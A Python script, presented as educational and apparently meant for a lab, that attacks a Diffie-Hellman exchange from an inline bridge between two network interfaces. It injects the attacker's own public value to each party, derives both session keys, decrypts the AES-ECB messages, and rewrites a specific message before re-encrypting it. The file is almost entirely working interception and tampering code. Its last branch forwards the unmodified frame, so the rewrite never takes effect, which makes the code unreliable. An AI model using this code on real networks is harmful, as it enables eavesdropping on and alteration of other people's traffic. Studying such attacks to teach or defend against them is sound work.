#!/usr/bin/python3

"""
Copyright Jakob Kristersson (2026)
THIS MODULE IS ONLY FOR EDUCATIONAL PURPOSES
"""


import dpkt
from dpkt.utils import inet_to_str
import copy
import sys
import os
import socket
import hashlib
import pyaes
import subprocess
from pyaes import AES

p = int('ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff', 16)
g = 2 # the generator of the group (Z/pZ)*
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
listenPort = 6004


interfaces = {"eth0", "eth1"}

THE_GOOD_MESSAGE = "I love you!"
MY_EVIL_MESSAGE = "I hate you :P"


def generate_random(N, bits=1536):
    """Generate a random number with bits=1536, then mod N."""
    byte = bits // 8
    rnd_num = os.urandom(byte)
    # ensure the number of bits is as high as 'bits'
    while rnd_num[0] < 128:
        rnd_num = os.urandom(byte)

    # convert from ascii to hex to a decimal integer
    rnd_num = int(''.join(format(i, 'x') for i in rnd_num), 16)
    return rnd_num % N

e = generate_random(p) # Eve's private exponent
Eve = pow(g, e, p)

Alice = 0
Alice_IP = "0.0.0.0"
Alice_key = bytes()

Bob = 0
Bob_IP = "0.0.0.0"
Bob_key = bytes()

def create_key(Num:int):
    dh = pow(Num, e, p)
    print(dh)
    return hashlib.sha256(bytes.fromhex(hex(dh)[2:])).digest()

def send_datagram(raw_packet, interface):
    try:
        s.bind((interface, 0))
        s.sendall(raw_packet)
    except OSError as e:
        print(f"Something went wrong in transmission: {e}, len:{len(raw_packet)}")

def handle_spoofed_data(data: str) -> str:
    
    try:

        print(f"Eevesdropped:{data}")
        if str(THE_GOOD_MESSAGE) in data:
            data = str(MY_EVIL_MESSAGE)
        
    finally:
        return data

def encrypt(plaintext: bytes, key: bytes):
    aes = pyaes.AESModeOfOperationECB(key)
    encrypter = pyaes.Encrypter(aes)
    ciphertext = encrypter.feed(plaintext)
    ciphertext += encrypter.feed()
    return ciphertext

def decrypt(ciphertext: bytes, key: bytes):
    aes = pyaes.AESModeOfOperationECB(key)
    decrypter = pyaes.Decrypter(aes)
    plaintext = decrypter.feed(ciphertext)
    plaintext += decrypter.feed()
    return plaintext


def swapTCPPayloadInEthernetFrame(eth : dpkt.ethernet.Ethernet, data : bytes) -> dpkt.ethernet.Ethernet :
    ip = eth.data
    tcp = ip.data

    tcp2 = copy.deepcopy(tcp)
    tcp2.data = data

    ip2 = copy.deepcopy(ip)
    ip2.data = tcp2
        
    eth2 = copy.deepcopy(eth)
    eth2.data = ip2

    return eth2

def is_handshake(tcp: dpkt.tcp.TCP):
    if tcp.flags & dpkt.tcp.TH_SYN:
        return True
    if len(tcp.data) == 0:
        return True
    return False

def process_datagram(raw_packet, fromIf):
    global Alice, Alice_IP, Alice_key, Bob, Bob_IP, Bob_key

    eth = dpkt.ethernet.Ethernet(raw_packet)
    toIf = "eth1" if fromIf == "eth0" else "eth0" # Switch the interface to be able to propagate the message.

    # Ignore ARP
    if not isinstance(eth.data, (dpkt.ip.IP, dpkt.ip6.IP6)):
        type = eth.type
        if type >= 0x6000 and type not in [0x0806, 0x88cc]: # ARP, LLDP
            print("not ipv4 or ipv6:", hex(eth.type))
        send_datagram(eth.__bytes__(), toIf)
        return
    ip = eth.data

    # Ignore UDP
    if not isinstance(ip.data, dpkt.tcp.TCP):
        protocol = dpkt.ip.get_ip_proto_name(ip.p)
        if protocol not in ["UDP", "ICMP", "ICMP6", "IGMP"]:
            print("Received proctocol:", protocol)
        send_datagram(eth.__bytes__(), toIf)
        return
    tcp = ip.data

    #Ignore Irrelevant communications, either of them has to be == listenPort
    if tcp.sport != listenPort and tcp.dport != listenPort:
        if(tcp.sport not in [22, 443] and tcp.dport not in [22, 443]):
            print(f"Wrong port (src:{tcp.sport}, dst:{tcp.dport})" )
        send_datagram(eth.__bytes__(), toIf)
        return
    
    # Ignore Handshake
    if is_handshake(tcp):
        subprocess.run(["LED", "B", "FAST"])
        print("Handshake!")
        send_datagram(eth.__bytes__(), toIf)
        return
    
    data = bytes(tcp.data)
    #if len(data) == 0:
    #    subprocess.run(["LED", "B", "FAST"])
    #    print("Handshake!")
    #    send_datagram(eth.__bytes__(), toIf)
    #    return
    
    
    if Alice == 0:
        Alice_IP = inet_to_str(ip.src)
        Bob_IP = inet_to_str(ip.dst)
        #Diffie Hellman num is transmitted as a hex-str
        Alice = int(data.decode(), 16)
        
        Alice_key = create_key(Alice)

        print("It's hacking time!")
        print("Alice's key is:", Alice_key.hex())

        data_bob = format(Eve, "x").encode("utf-8")
        
        
        eth2 = swapTCPPayloadInEthernetFrame(eth, data_bob)
        send_datagram(eth2.__bytes__(), toIf)
        
        subprocess.run(["LED", "W", "SOLID"])
        return
    elif Bob == 0 and Bob_IP == inet_to_str(ip.src):
        Bob_IP = inet_to_str(ip.src)

        #Diffie Hellman num is transmitted as a hex-str
        Bob = int(data.decode(), 16)
        Bob_key = create_key(Bob)

        print("Let's attack alice this time.")
        print("Bob's key is:", Bob_key.hex())

        data_alice = format(Eve, "x").encode()
        eth2 = swapTCPPayloadInEthernetFrame(eth, data_alice)
        send_datagram(eth2.__bytes__(), toIf)
        subprocess.run(["LED", "Y", "SOLID"])
        return
    
    elif Alice != 0 and Bob != 0 and len(data) > 0:
        sender = inet_to_str(ip.src)
        receiver = inet_to_str(ip.dst)

        decrypt_key = Alice_key if sender == Alice_IP else Bob_key
        encrypt_key = Alice_key if receiver == Alice_IP else Bob_key

        if decrypt_key == Alice_key:
            print("Alice has no idea.")
        else:
            print("Bob is such a fool.")

        plaintext = decrypt(data, decrypt_key).decode()
        data = handle_spoofed_data(plaintext)
        reencrypted = encrypt(data.encode(), encrypt_key)

        eth2 = swapTCPPayloadInEthernetFrame(eth, reencrypted)
        send_datagram(eth.__bytes__(), toIf)
        subprocess.run(["LED", "M", "SOLID"])
        return
    
    else:
        print("something else")
        send_datagram(eth.__bytes__(), toIf)
        return

if __name__ == "__main__":

    try:
        while True:
            subprocess.run(["LED", 'OFF'])
            raw_data, addr = s.recvfrom(dpkt.ethernet.ETH_LEN_MAX-4)

            interface = addr[0]
            if (interface == "eth0" or interface=="eth1"): 
                process_datagram(raw_data, interface)
            else:
                send_datagram(raw_data, interface)
    except KeyboardInterrupt:
        s.close()
